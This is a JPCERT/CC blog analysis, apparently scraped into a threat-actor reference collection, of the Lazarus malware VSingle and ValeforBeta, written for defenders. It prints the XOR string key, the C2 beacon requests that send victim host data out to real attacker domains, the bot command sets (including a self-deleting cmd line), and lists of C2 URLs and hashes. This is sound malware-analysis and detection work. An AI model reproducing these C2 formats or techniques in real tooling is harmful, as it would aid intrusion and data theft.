# Reference for threat actor for "Lazarus Group, Hidden Cobra, Labyrinth Chollima"

**Title**: Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta) - JPCERT/CC Eyes | JPCERT Coordination Center official Blog

**Source**: https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html

## Content

     
Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta) - JPCERT/CC Eyes | JPCERT Coordination Center official Blog
















      






 









JPCERT/CC Eyes

JPCERT Coordination Center official Blog

Language:


日本語
English







Top > List of “Incident” > Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)
      












朝長 秀誠 (Shusei Tomonaga)


March 22, 2021


Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)



Lazarus









Email




The attack group Lazarus (also known as Hidden Cobra) conducts various attack operations. This article introduces malware (VSingle and ValeforBeta) and tools used in attacks against Japanese organisations.
VSingle overview
VSingle is a HTTP bot which executes arbitrary code from a remote network. It also downloads and executes plugins. 
Once launched, this malware runs Explorer and executes its main code through DLL injection. (Some samples do not perform DLL injection.) The main code contains the following PDB path:

G:\Valefor\Valefor_Single\Release\VSingle.pdb

The next sections describe VSingle's obfuscation technique and communication format.
VSingle obfuscation technique
Most of the strings in VSingle are obfuscated. Figure 1 shows the code to disable obfuscation. A fixed key value (o2pq0qy4ymcrbe4s) decodes the strings by XOR.
Figure 1: Code to disable obfuscation in VSingle
Below is some parts of decoded strings:

[+] Download Parameter Error
[+] Download Result 
[+] Upload Result 
[+] Upload Parameter Error
[+] Interval
    Interval was set to 
[+] Plugin Download Result 
[+] Update
[+] Info
[+] Uninstall
    Valefor was uninstalled successfully.
[+] Executable Download Result 
[+] Executable Download Parameter Error
ufw=%s&uis=%u
cmd.exe /c %s
[%02d-%02d-%04d %02d:%02d:%02d]
[+] Plugin Execute Result

VSingle communication with C2 servers
Below is the HTTP GET request that VSingle sends to its C2 server at the beginning of the communication.

GET /polo/[Unix time]/[random string].php?ufw=[Base64 data]&uis=[unique ID] HTTP/1.1
Host: maturicafe.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)
Accept: text/html3,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

[Base64 data] contains the Base64-encoded value of "[IP address]|[Windows version number]|[version]". As a response to this request, AES-encrypted data including commands is downloaded from the server. The encryption key is specified in Set-Cookie header in the response. 
VSingle also works with authentication proxy (Basic authentication). If the malware contains proxy settings, it can communicate in proxy environment as follows:

GET https://maturicafe.com/polo/[Unix time]/[random string].php?ufw=[Base64 data]&uis=[unique ID] HTTP/1.1
Host: maturicafe.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)
Proxy-Connection: keep-alive
Proxy-Authorization: Basic [credential]
Pragma: no-cache
Cache-Control: no-cache

VSingle functions
VSingle has 8 simple functions as listed below:


Table 1: VSingle commands

Command number
Contents


1
Upload file


2
Set communication interval


3
Execute arbitrary command


4
Download/execute plugin


5
Update


6
Send malware information


7
Uninstall


8
Download file



It executes the following 4 types of plugins:

Windows PE file (saved as a .tmp file)
VBS file (saved as a .vbs file)
BAT file (saved as a .bat file)
Shellcode

Figure 2 shows a part of the code to execute a plugin.
Figure 2: Part of VSingle code to execute a plugin
Plugins are temporarily saved in %TEMP% folder and then executed except for the shellcode ones; They are saved in %TEMP% folder but loaded and executed on memory. 
When the command number 6 (sending malware information) is selected, the data in Figure 3 is sent. As for the version number, 4.1.1, 3.0.1 and others have been confirmed in addition to 1.0.1. It is possible that this number indicates some sort of identifier, rather than its malware version.
Figure 3: Sample information send with command number 6
ValeforBeta overview
ValeforBeta is a HTTP bot developed in Delphi, and its functions are even simpler than those of VSingle. Besides arbitrary code execution from remote network, it just uploads and downloads files. 
The next sections describe ValeforBeta's configuration and communication format.
ValeforBeta configuration
Figure 4 shows the code to load the configuration. It contains sample ID ("512" in Figure 4), access type and intervals, as well as C2 server information.
Figure 4: ValeforBeta configuration
There are 3 different access types:

Connect directly (INTERNET_OPEN_TYPE_DIRECT)
Use default setting (INTERNET_OPEN_TYPE_PRECONFIG)
Connect via proxy (INTERNET_OPEN_TYPE_PROXY)

ValeforBeta communication with C2 servers
Below is the HTTP POST request that ValeforBeta sends to its C2 server at the beginning of the communication.

POST /doc/total.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=[Base64 data]
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3)
Host: 3.90.97.16
Content-Length: 0
Proxy-Connection: Keep-Alive
Pragma: no-cache

Although it is a HTTP POST request, it does not contain any data to send. The Base64-encoded data after "JSESSIONID=" in the Cookie header contains the information of an infected host. Below is the format of Base64-encoded data.

[8-letter random string][data][random string (4-12 letters)]

[data] contains the version information of the malware and the IP address of the infected hosts. (See request type "0" in Appendix A for more details.) If the response from the server is "200 OK", the next request is sent (Request type "1"). 
The C2 server sends data including commands. The result of the command execution is sent as a part of the HTTP POST request, disguised as a BMP file. Figure 5 shows part of the code to send the command execution result.
Figure 5: ValeforBeta's code to send command execution result
ValeforBeta functions
ValeforBeta has only 6 functions as listed in Table 2.


Table 2: ValeforBeta commands

Command number
Contents


1
Download file


2
Upload file


3
Execute arbitrary shell command


4
Uninstall (Executes cmd /c ping -n 4 127.0.0.1 >NUL & echo VFB > "file name of itself")


6
Set Sleep Time


7
Send system information



The command execution result is XOR-encoded. Figure 6 shows the decoded string of data sent with command number 7 (sending system information).
Figure 6: Sample data sent by ValeforBeta
Tools used after intrusion
The attackers use the following 3 tools in this operation in order to relay communication with C2 server.

3Proxy
Stunnel
Plink

In closing
We introduced malware and tools that Lazarus used in the operation against Japanese organisations. We will provide an update if we find new types of malware. 
The C2 servers connected to the samples described in this article are listed in Appendix B. Please make sure that none of your devices is communicating with them.
Shusei Tomonaga 
(Translated by Yukako Uchida)
Appendix A: Data sent by ValeforBeta


Table A: Format of data sent

Offset
Length
Contents


0x00
1
Request type(0: Send client data, 1: Request a command, 2: Send command execution result)



0x01
4
Client ID (generated from hostname, username, OS install date/time and MAC address)


0x05
3
Malware version


0x08
4
IP address


0x0C
3
OS version




Data after 0x05 is XOR-encoded and added only for the request type "0".

Appendix B: C2 servers

http://aquagoat.com/customer
http://blacktiger.com/input
http://bluedog.com/submit
http://coraltiger.com/search
http://goldtiger.com/find
http://greentiger.com/submit
http://industryarticleboard.com/evolution
http://industryarticleboard.com/view
http://maturicafe.com/main
http://purplefrog.com/remove
http://whitedragon.com/search
https://coralcameleon.com/register
https://industryarticleboard.com/article
https://maturicafe.com/polo
https://salmonrabbit.com/login
https://whitecameleon.com/find
https://whiterabbit.com/input
http://toysbagonline.com/reviews
http://purewatertokyo.com/list
http://pinkgoat.com/input
http://yellowlion.com/remove
http://salmonrabbit.com/find
http://bluecow.com/input
http://www.karin-store.com/data/config/total_manager.php
http://katawaku.jp/bbs/data/group/group-manager.php
http://3.90.97.16/doc/total.php

Appendix C: Malware hash value

487c1bdb65634a794fa5e359c383c94945ce9f0806fcad46440e919ba0e6166e 
eb846bb491bea698b99eab80d58fd1f2530b0c1ee5588f7ea02ce0ce209ddb60








Email





Author






朝長 秀誠 (Shusei Tomonaga)











































Since December 2012, he has been engaged in malware analysis and forensics investigation, and is especially involved in analyzing incidents of targeted attacks. Prior to joining JPCERT/CC, he was engaged in security monitoring and analysis operations at a foreign-affiliated IT vendor. He presented at CODE BLUE, BsidesLV, BlackHat USA Arsenal, Botconf, PacSec and FIRST Conference. JSAC organizer.










Was this page helpful?


Yes
No

0 people found this content helpful.

If you wish to make comments or ask questions, please use this form.

This form is for comments and inquiries. For any questions regarding specific commercial products, please contact the vendor.






please change the setting of your browser to set JavaScript valid.

Thank you!












Related articles







Credential Theft and Domain Name Hijacking through Phishing Sites









F5 BIG-IP Vulnerability (CVE-2022-1388) Exploited by BlackTech









JPCERT/CC Releases URL Dataset of Confirmed Phishing Sites









Trends of Reported Phishing Sites and Compromised Domains in 2021









Attack Exploiting XSS Vulnerability in E-commerce Websites








Back


Top


Next












Categories


Malware


Incident


Event


Vulnerability


Security Technology


Forensic


Cyber Metrics


ICS-OT


Other






Tags


Python


Conference


Datper


ChChes


Training


Statistics and Indicator


Tool


BlackTech


LogonTracer


Report


Splunk


ElasticStack


impfuzzy


volatility


RedLeaves


PlugX


DarkHotel


Banking malware


Pacific_Islands


CSIRT


Password


Policy


DDoS


APT


Trend


Africa


SecureCoding


SysmonSearch


JSAC


IoT


IIoT


Quasar


LODEINFO


Lazarus


Emotet


Phishing


Metrics


TSUBAME


Standard-Guideline




      
            
      


        
  
  　



Authors

























































































































Archives

202318
202219
202120
202021
201918
201812
201717
201618
201520
201418
20137
20122
20118
20104

















JPCERT/CC

8F Tozan Bldg, 4-4-2 Nihonbashi-Honcho, Chuo-ku, Tokyo 1030023 JAPAN
TEL: +81-3-6271-8901　FAX: +81-3-6271-8908





Privacy Policy
Disclaimer



© 1996-2024 JPCERT/CC







  